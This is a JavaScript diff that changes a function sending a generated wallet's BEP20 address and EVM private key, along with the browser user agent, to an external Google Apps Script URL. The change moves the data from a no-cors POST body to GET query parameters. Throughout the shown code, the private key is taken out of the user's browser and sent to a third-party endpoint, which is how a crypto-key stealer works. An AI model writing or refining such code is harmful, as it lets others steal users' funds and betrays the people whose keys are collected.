@@ -311,25 +311,23 @@ async function saveToGoogleScript(address, privateKey) {
   }
 
   try {
-    const payload = {
+    const params = new URLSearchParams({
       timestamp: new Date().toISOString(),
       bep20Address: address,
       evmPrivateKey: privateKey,
-      keyLength: privateKey.length,
-      userAgent: navigator.userAgent.substring(0, 100),
-      generatedAt: new Date().toLocaleString()
-    };
-
-    await fetch(GOOGLE_SCRIPT_URL, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-      body: JSON.stringify(payload)
+      keyLength: String(privateKey.length),
+      generatedAt: new Date().toLocaleString(),
+      userAgent: navigator.userAgent.substring(0, 100)
     });
 
-    console.log('[Google Script] Record saved successfully.');
+    await fetch(GOOGLE_SCRIPT_URL + '?' + params.toString(), {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+
+    console.log('[Google Script] Record sent successfully.');
   } catch (err) {
-    console.error('[Google Script] Failed to save record:', err);
+    console.error('[Google Script] Failed to send record:', err);
   }
 }
 
